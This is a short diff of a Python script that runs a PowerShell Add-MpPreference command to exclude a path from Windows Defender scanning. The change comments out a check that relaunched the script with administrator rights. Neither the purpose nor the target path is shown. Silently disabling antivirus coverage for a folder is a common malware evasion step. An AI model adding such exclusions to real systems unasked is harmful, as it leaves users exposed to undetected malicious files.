@@ -22,9 +22,9 @@ fil = current.text[0]
 command = f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path_to_exclude}\""
 
 try:
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        # If not running as admin, relaunch with admin privileges
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    # if not ctypes.windll.shell32.IsUserAnAdmin():
+    #     # If not running as admin, relaunch with admin privileges
+    #     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
     subprocess.run(command, check=True, shell=True)
 
